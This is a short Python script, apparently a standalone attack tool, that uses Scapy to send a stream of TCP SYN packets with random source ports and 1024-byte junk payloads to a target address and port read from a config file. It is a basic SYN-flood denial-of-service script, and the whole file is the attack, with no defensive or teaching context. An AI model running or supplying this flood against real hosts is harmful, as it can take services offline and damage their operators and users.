from scapy.all import *
from config import Config

config = Config()

target_ip = config.ATKIPv4
target_port = config.ATKPort
ip = IP(dst=target_ip)
tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
raw = Raw(b"X" * 1024)
p = ip / tcp / raw
send(p, loop=10, verbose=0)
